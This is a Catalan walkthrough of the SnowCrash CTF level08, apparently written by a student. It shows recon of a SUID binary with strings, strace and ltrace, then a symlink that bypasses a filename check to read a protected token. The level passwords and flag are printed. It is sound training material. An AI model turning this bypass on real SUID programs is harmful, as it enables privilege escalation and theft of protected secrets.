# TL;DR / TLTR
### TOCTOU (Time Of Check vs Time Of Use)
##### Ens connectem al següent nivell amb el token/password obtingut en el nivell anterior:
```bash
level07@SnowCrash:~$ ssh level08@192.168.122.220 -p 4242
Could not create directory '/home/user/level07/.ssh'.
The authenticity of host '[192.168.122.220]:4242 ([192.168.122.220]:4242)' can't be established.
ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level07/.ssh/known_hosts).
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          
level08@192.168.122.220's password: fiumuikeil55xe9cu4dood66h
```
##### Llistem els arxius visibles i ocults del directori /home
```bash
level08@192.168.122.220's password: 
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
##### Els fitxers remarcats com a level08 i token són de propietat de flag08i a més el primer fitxer és SUID permís amb caràcter ('s') i ACL ('+')
```bash
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
##### Revisem els ACL de level08
```bash
level08@SnowCrash:~$ getfacl level08
# file: level08
# owner: flag08
# group: level08
# flags: ss-
user::rwx
group::---
group:level08:r-x
group:flag08:r-x
mask::r-x
other::---
```
##### strings command del fitxer level08
```bash
level08@SnowCrash:~$ strings level08 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
exit
__stack_chk_fail
printf
strstr
read
open
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh 
QVhT
UWVS
[^_]
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
level08.c
long long int
GNU C 4.6.3
envp
long long unsigned int
/home/user/level08
level08.c
unsigned char
short int
argc
short unsigned int
argv
main
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
crtstuff.c
__CTOR_LIST__
__DTOR_LIST__
__JCR_LIST__
__do_global_dtors_aux
completed.6159
dtor_idx.6161
frame_dummy
__CTOR_END__
__FRAME_END__
__JCR_END__
__do_global_ctors_aux
level08.c
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strstr@@GLIBC_2.0
__i686.get_pc_thunk.bx
read@@GLIBC_2.0
data_start
printf@@GLIBC_2.0
_edata
_fini
__stack_chk_fail@@GLIBC_2.4
err@@GLIBC_2.0
__DTOR_END__
__data_start
__gmon_start__
exit@@GLIBC_2.0
__dso_handle
open@@GLIBC_2.0
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
write@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
_init
```
##### Informació rellevant descoberta amb strings level08:
```bash
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
```
##### Tot i així analitzarem amb strace command del fitxer level08
```bash
level08@SnowCrash:~$ strace ./level08
execve("./level08", ["./level08"], [/* 27 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 3), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "./level08 [file to read]\n", 25./level08 [file to read]
) = 25
exit_group(1)                           = ?
level08@SnowCrash:~$ strace -f ./level08
execve("./level08", ["./level08"], [/* 27 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 3), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "./level08 [file to read]\n", 25./level08 [file to read]
) = 25
exit_group(1)                           = ?
```
##### Tractem ara d'analitzar el fitxer anomenat token
```bash
level08@SnowCrash:~$ strace ./token
execve("./token", ["./token"], [/* 27 vars */]) = -1 EACCES (Permission denied)
dup(2)                                  = 3
fcntl64(3, F_GETFL)                     = 0x8002 (flags O_RDWR|O_LARGEFILE)
fstat64(3, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 3), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
_llseek(3, 0, 0xbfffe1d0, SEEK_CUR)     = -1 ESPIPE (Illegal seek)
write(3, "strace: exec: Permission denied\n", 32strace: exec: Permission denied
) = 32
close(3)                                = 0
munmap(0xb7fda000, 4096)                = 0
exit_group(1)                           = ?
```
##### Provarem a veure com es comporta
```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                      = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)  = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
##### Ja tenim clar la vulnerabilitat, programa revisa nom fitxer no el fitxer
```bash
level08@SnowCrash:~$ ln -s token /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
level08: Unable to open /tmp/test: No such file or directory
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/exploit
level08@SnowCrash:~$ ./level08 /tmp/exploit
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$
```
##### Resum de com funciona l'exploit
```text
EXPLOIT: SYMLINK
Un symlink és la creació d'un “accés directe”: ln -s origen destí 
Link → NO conté "token", però apuntarà a → token
ln -s /home/user/level08/token /tmp/file
/tmp/file → apunta a token
./level08 /tmp/file
```
##### Finalment obtenim la getflag/password pel següent nivell:
```bash
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$
```






